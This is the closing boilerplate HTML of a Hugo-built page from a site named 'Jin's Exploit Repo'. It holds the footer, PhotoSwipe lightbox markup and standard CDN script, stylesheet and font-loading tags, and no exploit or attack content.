    <footer class="site-footer">
    <section class="copyright">
        &copy; 
        
            2020 - 
        
        2022 Jin&#39;s Exploit Repo
    </section>
    
    <section class="powerby">
        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.16.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
    </section>
</footer>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
